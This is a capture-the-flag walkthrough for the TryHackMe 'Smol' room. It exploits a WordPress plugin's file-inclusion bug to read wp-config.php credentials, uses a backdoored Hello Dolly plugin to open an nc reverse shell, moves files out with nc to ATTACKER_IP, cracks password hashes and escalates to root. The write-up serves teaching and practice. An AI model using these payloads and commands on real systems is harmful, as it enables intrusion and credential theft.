# Smol Walkthrough
<br/>

## Intro
Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/smol) on TryHackMe.

Here is the room description:
```
At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
```

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's Begin !

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP smol.thm" | sudo tee -a /etc/hosts
```

Now we scan for open ports with *nmap*:
```bash
nmap -sV -sC smol.thm 
```

The tool finds 2 open ports:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.thm/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the nmap scripts scan we can already find a subdomain, let's add it to the hosts file `www.smol.thm`.

Now we can visit the website: `http://www.smol.thm`, on the homepage we can see info about "AnotherCTF".
Let's review the page source code and run a scan for hidden directories in the background.
```bash
gobuster dir -u http://www.smol.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 160 
```

The following directories show a 301 (redirect), probably behind a login.
```
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
/index.php            (Status: 301) [Size: 0] [--> http://www.smol.thm/]
```

Looking at those directories we can infer that the website is on WordPress, this means that we can run a tool like *wpscan*:
```bash
wpscan --url http://www.smol.thm   
```

This will scan for common WordPress paths and data, you will get and output like this one:
```bash
[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=====================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

```

It found some additional directories and files:
```
http://www.smol.thm/xmlrpc.php
http://www.smol.thm/wp-cron.php
http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

Also we see WordPress version, which is 6.7.1
A thing to know about WP is that it constantly has some vulnerabilities about plugins, themes of file uploads, so let's start by researching the only plugin found `jsmol2wp`.

We can find a couple of CVEs: CVE-2018-20463-CVE-2018-20462 -> Local File Inclusion vulnerability + SSRF + XSS.
We can get the WP config file via LFI:
```http
GET http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

Out of many things this file contains a set of credentials `wpuser:kbLSF2Vop#lw3rjDZ629*Z%G`.

We can use this creds to login at `http://www.smol.thm/wp-login.php`; this grants us access to the admin dashboard.
Looking around in the admin panel i found a page called "WebMaster Task!!" at:
```http
GET http://www.smol.thm/wp-admin/post.php?post=58&action=edit
```

It contains an interesting line:
```
[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
```

A bit of research showed that we can inject code at `/hello.php`, to confirm that i sent a simple `whoami` via the `cmd` parameter:
```http
http://www.smol.thm/wp-admin/hello.php?cmd=whoami
```

This prints "www-data" on the screen, we have confirmed the vulnerability, now we need to get a shell, i used nc mkfifo reverse shell and URL encoded it:
```http
http://www.smol.thm/wp-admin/hello.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20%2Di%202%3E%261%7Cnc%2010%2E9%2E3%2E197%201234%20%3E%2Ftmp%2Ff
```

Before sending it be sure to have a listener ready:
```bash
nc -lvnp 1234
```

Now we got a shell as "www-data".

Listing the `/home` directory we find 4 users:
```
drwxr-x---  2 diego internal 4096 Aug 18  2023 diego
drwxr-x---  2 gege  internal 4096 Aug 18  2023 gege
drwxr-x---  5 think internal 4096 Jan 12  2024 think
drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi
```

But for now we cant access any of those directories.

<br/>

### Privilege Escalation

#### Lateral
Looking around i found an interesting backup: `/opt/wp_backup.sql`, let's transfer it to our machine:
```bash
nc -lvnp 4444 > wp_backup.sql
```

On target:
```bash
nc -nv ATTACKER_IP 4444 < wp_backup.sql
```

Now  let's look for strings:
```bash
strings  wp_backup.sql
```

```sql
INSERT INTO `wp_users` VALUES REDACTED_FOR_THE_WRITEUP
```

This is nice we find all users password's hashes; time to crack them: (make sure to append the names `name:hash`)
```bash
john --format=phpass --wordlist=rockyou.txt hashes.txt
```

We find diego password REDACTED_PASSWORD.

Now we can switch user:
```bash
su diego
```

There is the user flag in his home:
```bash
cat /home/diego/user.txt
```
--> REDACTED_FLAG


From my machine i transferred the `linpeas.sh` script on the target using a python HTTP server:
```bash
python3 -m http.server
```

On target:
```bash
wget http://ATTACKER_IP:8000/linpeas.sh
```

Now let's make the file executable and run it:
```bash
chmod +x linpeas.sh
```
```bash
./linpeas.sh > linpeas_report
```

For better readability i then transferred the report on my machine:
```bash
nc -lvnp 4444 > linpeas_report
```

On target:
```bash
nc -nv ATTACKER_IP 4444 < linpeas_report
```


##### Becoming Think
We find that we have read access to the user "think" SSH key:
```bash
cat /home/think/.ssh/id_rsa
```

Transfer or copy it to your machine, then login as him:
```bash
chmod 600 id_rsa
```
```bash
ssh -i id_rsa think@smol.thm
```

This fails, lets try to do it from the target machine:
```bash
cp /home/think/.ssh/id_rsa .
```
```bash
chmod 600 id_rsa
```
```bash
ssh -i id_rsa think@localhost
```

This time worked, we are now "think".


> [!NOTE] Not Useful anymore but Interesting
> `cat /var/www/wordpress/wp-config.php`
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'REDACTED_PASSWORD' );
define( 'DB_HOST', 'localhost' );

##### Becoming Gege
We find out from linpeas that we can read `/etc/pam.d`, exploring the files the `su` one has some interesting lines:
```
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
```

This means that as "think" we can authenticate to "gege" without the need of a password:
```bash
su gege
```

##### Becoming Xavi
Inside her home we find a file created by root: `wordpress.old.zip`, transfer it to your machine.
If we try to extract the files it requires a password, let's crack it with john:
```bash
zip2john wordpress_old.zip > hash4john.txt
```

Now crack it:
```bash
john hash4john.txt --wordlist=rockyou.txt
```

We get the password: `READACTED_PASSWORD`

Now extract the files:
```bash
unzip wordpress.old.zip
```

There are many files let's look for credentials:
```bash
cd wordpress.old
```
```bash
grep -lr password
```


We find Xavi password inside the `wp-config.php` file: `P@ssw0rdxavi@`

Now move to xavi:
```bash
su xavi
```

<br/>

#### Becoming Root
Check if we can run anything as sudo:
```bash
suod -l
```

Yes!
```
User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

Read the root flag:
```bash
sudo cat /root/root.txt
```

<br/>
<br/>

## Conclusion
Congratulations you have successfully dumped the database data and escalate your privileges through several user to become root.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
